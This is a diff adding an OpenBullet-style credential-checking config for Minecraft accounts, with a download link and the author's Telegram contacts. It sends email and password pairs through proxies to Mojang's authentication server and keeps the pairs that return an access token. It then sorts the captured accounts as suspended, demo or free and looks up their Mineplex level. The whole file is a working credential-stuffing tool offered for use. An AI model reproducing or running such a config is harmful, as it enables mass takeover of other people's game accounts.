@@ -1,0 +1,127 @@
+#You can download it as loli from this link: 
+https://cdn.discordapp.com/attachments/982266499840491560/1005847728053555200/Minecraft.anom
+virustotal: https://www.virustotal.com/gui/file/02ed8c3aff1385a7d2c2a3e4784ea8be70681db29f600986290b4e5f017a0c30?nocache=1
+
+
+my Telegram ID: @MRzodiack2 & @gangano
+
+
+[SETTINGS]
+{
+  "Name": "Minecraft",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-08-02T15:42:38.6132065-07:00",
+  "AdditionalInfo": "",
+  "Author": "MRzodiack",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Telegram ID @MRzodiack2 & @gangano ",
+      "VariableName": "",
+      "Id": 640379710
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#<POST_ACCOUNT> REQUEST POST "https://authserver.mojang.com/authenticate" 
+  CONTENT "{\"password\":\"<PASS>\",\"requestUser\":true,\"username\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: authserver.mojang.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 661" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Accept: application/json" 
+  HEADER "Origin: https://my.minecraft.net" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Referer: https://my.minecraft.net/en-us/login/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#<KEYCHECK> KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"accessToken\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid credentials. Invalid username or password" 
+    KEY "{\"error\":\"ForbiddenOperationException\",\"" 
+
+#<PARSE_TOKEN> PARSE "<SOURCE>" JSON "accessToken" -> VAR "elRekt" 
+
+#<GET_PROFILE> REQUEST GET "https://api.mojang.com/user/profiles/agent/minecraft" 
+  
+  HEADER "Host: api.mojang.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Origin: https://my.minecraft.net" 
+  HEADER "Authorization: Bearer <elRekt>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Referer: https://my.minecraft.net/en-us/profile/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#<CHECK> KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "Account Suspended" OR 
+    KEY ",\"suspended\":true,\"" 
+  KEYCHAIN Custom "Demo Account" OR 
+    KEY "[]" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY ",\"paid\":false,\"" 
+
+#<PARSE_USERNAME> PARSE "<SOURCE>" JSON "name" CreateEmpty=FALSE -> CAP "Username" 
+
+#<REQUEST_MINEPLEX> REQUEST GET "https://www.mineplex.com/players/<Username>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#<PARSE_LEVEL> PARSE "<SOURCE>" LR "<b style=\"color: #42b9f4;\">Level " "</b>&nbsp;&nbsp" -> VAR "Account Level" 
+
+#<TRANSLATE> FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY " " VALUE "No Record" 
+  "<Account Level>" -> CAP "Account Level" 
